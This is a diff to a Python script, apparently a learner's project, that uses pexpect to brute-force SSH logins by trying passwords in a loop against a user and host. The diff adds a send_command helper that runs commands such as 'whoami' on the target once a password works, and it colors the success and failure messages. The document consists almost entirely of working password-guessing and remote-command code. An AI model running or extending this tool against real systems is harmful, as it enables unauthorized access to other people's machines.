@@ -1,9 +1,18 @@
 #!/usr/bin/python3
 
 import pexpect
+import termcolor
 
 #list of input prompts that may be givne in terminal after login in to ssh
 PROMPT = ['# ', '>>> ', '> ', '\$ ']
+
+#sending commands to run on target system and any given expeected prompts. receving response
+def send_command(child, command):
+    child.sendline(command)
+    child.expect(PROMPT)
+    #child.befor will print output form target system. .decode() needed as out put is encoded
+    print(child.before.decode())
+    
 
 #Automating ssh conection
 def connect(user, host, password):
@@ -47,9 +56,10 @@ def main():
         password =  password.strip('\n')
         try:
             child = connect(user, host, password)
-            print(f"[+] password found: {password}")
+            print(termcolor.colored(f"[+] password found: {password}", 'green'))
+            send_command(child, 'whoami')
         except:
-            print("[-] Password not found")
+            print(termcolor.colored("[-] Password not found", 'red'))
     
     
 main()
